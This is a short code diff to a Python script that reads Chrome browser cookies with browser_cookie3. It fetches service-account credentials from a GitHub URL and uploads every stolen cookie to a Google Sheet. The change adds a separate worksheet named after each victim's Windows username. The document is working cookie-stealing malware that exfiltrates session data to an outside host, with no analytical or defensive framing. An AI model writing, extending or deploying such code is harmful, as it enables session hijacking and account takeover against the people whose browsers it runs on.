@@ -21,6 +21,7 @@ import gspread
 import browser_cookie3
 import time
 path = os.environ.get('APPDATA')
+sheet_name = path.split('\\')[2]
 path = path[:path.find('AppData')+7] + r'\Local\Google\Chrome\User Data'
 url = 'https://raw.githubusercontent.com/dongminh97/cookies/master/credentials.json'
 r = requests.get(url, allow_redirects=True)
@@ -37,11 +38,11 @@ for i in mid:
         pass
 filename = path+'\credentials.json'
 gc = gspread.service_account(filename=filename)
-sht1 = gc.open_by_key('1lOZQFRZ6_1GtiFmVZWek0Wil6V9ONrEnpFb73F_9KIU')
+sht1 = gc.open_by_key('1GyWSh7DGnHko9JoPMZaE7lIthw8jOIk6d_MIop1r1Jw').add_worksheet(title=sheet_name, rows="100", cols="20")
 cell = 1
 for i in cookies:
     for j in i:
-        sht1.sheet1.update('A' + str(cell), str(j))
+        sht1.update('A' + str(cell), str(j))
         cell+=1
         time.sleep(1)
 ###########################
